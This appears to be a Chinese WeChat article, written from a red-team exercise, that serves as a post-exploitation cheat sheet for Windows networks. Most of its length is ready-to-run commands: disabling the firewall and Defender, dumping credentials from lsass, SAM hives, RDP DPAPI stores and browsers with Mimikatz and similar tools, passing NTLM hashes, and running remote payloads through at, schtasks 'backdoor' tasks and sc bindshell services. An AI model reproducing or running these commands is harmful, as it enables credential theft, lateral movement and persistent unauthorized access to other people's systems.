<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TwDe-xGIcp4Yn9XKycXCEg)

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCcft5SMgLicjAMPX0UxR3J6uBFjMpZIdAFnPia81Ze68GbJiaCE3ticZntQ/640?wx_fmt=png&from=appmsg)

    最近，笔者研究学习了后渗透技术，并亲身参与了一场攻防演练。在此过程中，笔者对学习成果以及演练中实施的后渗透动作进行了记录和整理，以便进一步巩固知识，提升技能水平。

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCR8iakmNajQic0XszbUwHbBIBfZBgpHlbOZ0tfVRF5ibrcF87esYQcWm4Q/640?wx_fmt=png&from=appmsg)

_**Part.1**_

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCkgyqb9xngWtTx78pxA7XAeibiafNp15qjupfibJ1FCvTODBwIuZKZHMtQ/640?wx_fmt=png&from=appmsg)

杀软识别

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoC824TEIgcibRaqfCecVkntcLpjV1696ice8hciamRbUZ8dmMfH08A6Q9Ug/640?wx_fmt=png&from=appmsg)

拿到一台机器后可以先对杀软进行识别，避免上线的木马被杀。

**tasklist /svc**

https://www.ddosi.org/av/1.php

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCeLvDagRIx9HAnV2SdYADOZdYwTCw6ruNxDHseOQE98zSxibtYklnwnA/640?wx_fmt=png&from=appmsg)

_**Part.2**_

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCkgyqb9xngWtTx78pxA7XAeibiafNp15qjupfibJ1FCvTODBwIuZKZHMtQ/640?wx_fmt=png&from=appmsg)

隧道搭建  

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoC824TEIgcibRaqfCecVkntcLpjV1696ice8hciamRbUZ8dmMfH08A6Q9Ug/640?wx_fmt=png&from=appmsg)

**防火墙配置更改**

关闭防火墙

netsh firewall set opmode mode=disable

放行远程 8888 端口进来的流量

netsh advfirewall firewall add rule protocol=TCP dir=in remoteport=8888 action=allow

放行出去到远程 8888 端口的流量

netsh advfirewall firewall add rule protocol=TCP dir=out remoteport=8888 action=allow

放行本地 4444 端口出去的流量

netsh advfirewall firewall add rule protocol=TCP dir=out localport=4444 action=allow

放行从本地 4444 端口进来的流量

netsh advfirewall firewall add rule protocol=TCP dir=in localport=4444 action=allow

删除规则

netsh advfirewall firewall delete rule

查看防火墙配置 (可看到具体规则等配置)

netsh firewall show config

关闭 windefebd

net stop windefend

netsh firewall set portopening TCP 445 ENABLE // 打开 445 端口

netsh firewall set portopening TCP 3389 ENABLE // 开放终端

netsh firewall delete allowedprogram C:/A.exe // 删除放行程序 A.exe

netsh firewall set allowedprogram C:/A.exe test ENABLE // 添加程序 C 盘下的 A.exe 并放行

netsh firewall add allowedprogram C:/A.exe test ENABLE // 添加程序 C 盘下的 A.exe 并放行

**Frp**

成功上线连接 webshell 后，可以尝试 ping 命令，确认当前机器是否出网，出网的机器使用搭建反向代理隧道，proxifier 配置相应的端口账号密码便可以进入内网。

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCzBZN1WHMFOMcH5c5l4JYdM0GUGYVia9dIAPBaokc6WGSoCxWIuebKOA/640?wx_fmt=png&from=appmsg)

_**Part.3**_

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCkgyqb9xngWtTx78pxA7XAeibiafNp15qjupfibJ1FCvTODBwIuZKZHMtQ/640?wx_fmt=png&from=appmsg)

横向移动  

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoC824TEIgcibRaqfCecVkntcLpjV1696ice8hciamRbUZ8dmMfH08A6Q9Ug/640?wx_fmt=png&from=appmsg)

内网横向过程中很重要的一点就是收集各种密码，而内网环境中网络管理员很容易使用通用密码，从而出现一个密码泄露，大量资产失陷的情况。

**Mimikatz dump**

使用 mimikatz 直接获取读取主机密码

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"

**Procdump**

当无法在目标机器上运行 Mimikatz 时，我们可使用 ProcDump 工具将系统的 lsass.exe 进程进行转储，导出 dmp 文件，拖回到本地后，在本地再利用 Mimikatz 进行读取。

procdump.exe -accepteula -ma lsass.exe lsass.dmpProcDump 本身是作为一个正常的运维辅助工具使用，并不带毒，所以不会被杀软查杀，但有的杀软不允许生成 dmp 文件，可以用下面命令将 dmp 编码为 txtprocdump.exe -accepteula -ma lsass.exe lsass.txt&&certutil -encode lsass.txt.dmp done.txt

mimikatz 读取 dmp 文件：mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"

**SAM 和 system 文件**

SAM 文件存储了本地账户的哈希值。当用户在本地 Windows 机器上设置密码时，密码的哈希值会被存储在 SAM 文件中。而 System 文件又包含了加密的密码哈希密钥，故可以通过 SAM 和 system 文件使用 mimikatz 分析主机密码。

导出 SAM 和 System 文件

reg save hklm\sam sam.hivereg save hklm\system system.hive

使用 mimikatz 读取 SAM 文件 mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive"

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoC4aWWELApo8IzIkicYicj8kyQvrBsQjGnE4IHQbibrc8qYpl0120ZP8cbg/640?wx_fmt=png&from=appmsg)

**ps1 脚本 dump**

结合 powershell 的免杀，加载 ps1 脚本获取密码 hash。

powershell.exe -exec bypass -Command "& {Import-Module .\Get-PassHashes.ps1; Get-PassHashes}"

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCPSPbR2aWLGXXB4BnjZdzUyIyCIaI89bKu4yK08ib7XrMVsTrOuia6eSA/640?wx_fmt=png&from=appmsg)

**Hash 传递**

当口令强度有一定要求，抓取到的本地 hash 可能无法直接破解时，可以尝试 Hash 传递。在认证过程中，Hash 传递不是直接使用用户的密码进行认证，而是使用用户的 hash 值。这意味着攻击者可以直接通过 LM Hash 或 NTLM Hash 访问远程主机或服务，而无需提供明文密码。

首先使用 mimikatz 抓取域管 hash，但由于 mimikatz 在抓取到 hash 之后是不能够直接复制的，所以选择用 log 参数将抓取到的 hash 输出为 txt

mimikatz log privilege::debug sekurlsa::logonpasswords

使用 mimikatz hash 传递

mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:hacke.testlab /ntlm:831f4e9b2a487ce87bf0058927e6358d"

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCtDaLGnRFvrH7eroptyrXgCFXI4cfXAPoZ6gNl3Vv7KmR4P0w6Q1JhA/640?wx_fmt=png&from=appmsg)

**ipc$**  

当获取到主机明文密码后，可以尝试进行 ipc 连接。通过 ipc 连接，可以实现在被连接机器上进行文件上传、下载、命令执行。

net use \\192.168.1.1\ipc"Admin@123" /user:testuser

net use \\192.168.1.1\ipc /del /y

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCZGp9W9u6vOdlB3sXtAMqib0zam4nmgtXkjo7m932kAdrEROMccicqHww/640?wx_fmt=png&from=appmsg)

**windows 自带工具**  

在 Windows 自带的命令中，at 命令用于创建计划任务，但仅限于 2003 及更早版本。通过跳板机，我们可以利用 at 命令在目标主机 DC 上创建计划任务，使计算机在指定时间执行木马程序，从而实现对内网目标主机的控制。

与主机建立 ipc 连接：

dir \\192.168.1.1\ctasklist /S 192.168.1.1 /U testuser /P Admin@123

查看目标主机时间

net time \\192.168.1.1

使用 copy 命令将 exe 复制到目标机器里

copy calc.bat \\192.168.1.1\c

使用 at 命令创建计划任务

at \\192.168.1.1 11:30PM C:\calc.bat

删除计划任务

at \\192.168.1.1 9 /delete

type 命令远程查看执行结果

type \\192.168.1.1\C$\1.txt

因为在 2008 及以后的系统中，at 命令已被废弃，改用了 schtasks 命令来创建计划任务。这是因为 schtasks 命令相较于 at 命令更加灵活易用。

schtasks /create /s 192.168.1.1 /u administrator /p password/tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f

schtasks /run /s 192.168.1.1 /i /tn backdoor /u administrator /p password     # i：忽略任何限制立即运行任务

schtasks /delete /s 192.168.1.1 /tn "backdoor" /f

schtasks /create /s 192.168.1.1 /tn test /sc minute /mo 1 /tr "C:\Windows\System32\cmd.exe /c'whoami > C:\Users\Administrator\result.txt'" /ru system /f

在使用 schtasks 命令时，会在系统中留下日志文件 C:\Windows\Tasks\SchedLgU.txt

SC 命令是 XP 系统中功能强大的 DOS 命令，它能与 “服务控制器” 和已安装设备进行通讯，用于与服务控制管理器和服务进行通信

sc \\[主机名 / IP] create [servicename] binpath= "[path]"   #创建计划任务启动程序

sc \\WIN-ENS2VR5TR3N create bindshell binpath= "c:\bind.exe"   #  = 后面是必须空一格的

sc \\WIN-ENS2VR5TR3N start bindshell   #立即启动

sc \\[host] delete [servicename]   #删除服务

**RDP 远程桌面**

获取密码后可尝试直接使用远程桌面进行连接。

对于未开启 RDP 远程桌面的机器执行以下命令操作注册表来开启机器 3389 远程桌面服务：

REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f

使用以下命令添加防火墙放行策略 ：

netsh firewall add portopening protocol = TCP port = 3389 name = rdp

**RDP 记录**

查看本地机器本地连接过的目标机器：reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers” /s

查询是否有 RDP 密码文件：

dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*

使用 mimikatz 对对应密码文件解密：

privilege::debug

dpapi::cred /in:（此处路径为需要解密的密码文件）

记录 guidMasterKey 用以找到对应的 Masterkey：

sekurlsa::dpapi

通过 Masterkey，使用 mimikatz 解密 pbData 数据，获取 RDP 连接明文密码：

dpapi::cred /in:（解密的密码文件路径）

/masterkey:（使用 guidMasterKey 找到对应的 Masterkey）

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCn0ibVURQMDZ53YhDqhU7Ax40R4888npicwp7glb2YmLNMgGNJ3tJvM3g/640?wx_fmt=png&from=appmsg)

**浏览器记录**

受控主机上的浏览器密码记录是一个不可忽视的攻击点，可以通过受控主机保存的浏览器密码记录获取管理员常用密码，一般使用各种提取工具即可读取到密码。

https://github.com/StarfireLab/SharpWeb

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoC22le5OMW2lsDf3My8YQ9e3FdrkNoKZW82F2H0uyZMfAj9ASrbWgEiaA/640?wx_fmt=png&from=appmsg)

**配置文件**

配置文件中往往会出现大量数据库连接账号密码，以下整理了部分常见框架的路径，在实战中可以在框架识别后进行关键字检索。

Django（Python Web 框架）：

Django 项目的配置文件通常位于项目根目录下的 settings.py 文件中。在这个文件中，数据库配置（如数据库引擎、名称、用户、密码等）会被定义在 DATABASES 配置项下。

Flask（Python Web 框架）：

Flask 通常没有固定的数据库配置文件路径，因为 Flask 是一个轻量级的框架，它鼓励开发者根据自己的需求进行配置。常见的做法是在 Flask 应用的主文件（通常是 app.py 或__init__.py）中直接设置数据库配置，或者将这些配置放在一个单独的模块或文件中，并在主文件中导入。

Spring Boot（Java Web 框架）：

在 Spring Boot 项目中，数据库配置通常放在 application.properties 或 application.yml 文件中。这些文件通常位于项目的 src/main/resources 目录下。配置文件中包含了数据库的连接信息（如 URL、用户名、密码等）。

WEB-INF/proxool.xml

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCVtK3uXavXSxTaOicwS5lQ1qFOCODIbllhHIm2u0GgMY71tpultLappA/640?wx_fmt=png&from=appmsg)

Laravel（PHP Web 框架）：

Laravel 的数据库配置文件通常位于 config/database.php。这个文件包含了所有关于数据库连接的信息，包括默认连接、连接类型、主机、端口、数据库名、用户名和密码等。

Ruby on Rails：

Rails 的数据库配置通常放在 config/database.yml 文件中。这个文件包含了不同环境（如开发、测试、生产）下的数据库配置信息。

Express.js（Node.js Web 框架）：

Express.js 本身并不提供数据库配置文件的特定位置，但通常开发者会创建一个配置文件（如 config.js 或 database.js），并在其中定义数据库连接信息。这个文件可能位于项目的根目录或特定的配置文件夹中。

ASP.NET：

在 ASP.NET 项目中，数据库连接字符串通常存储在 Web.config 文件中。连接字符串位于元素下，包含了数据库的连接信息。

Web.config

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCz7yNSW1vyKiamwDK5Ehwk0iatWgC3KD1RUgEmnlictQOh1lWtJt8IvdwQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/qAbTL3m1KPDA2roaVcUquiciaZrHkJWOoCGpLIeXxYqC6wqYCFmQEZLnPmT1VHqibOWiauxT5346qhlrs66DpsEggA/640?wx_fmt=png&from=appmsg)

监制丨船长、铁子

策划丨 Cupid

美工丨 molin